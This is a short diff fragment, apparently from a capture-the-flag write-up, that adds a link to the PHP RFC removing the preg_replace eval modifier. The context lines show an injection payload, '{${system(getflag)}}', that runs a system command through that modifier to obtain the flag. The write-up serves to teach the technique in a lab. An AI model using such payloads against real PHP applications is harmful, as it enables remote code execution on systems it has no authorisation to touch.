@@ -15,7 +15,7 @@ Or just exploit this single small script on this folder.
 ```
 [ft whateverMalicous]
 ```
-
+# https://wiki.php.net/rfc/remove_preg_replace_eval_modifier
 # in our case we want the flag so
 ```
 [ft {${system(getflag)}}]
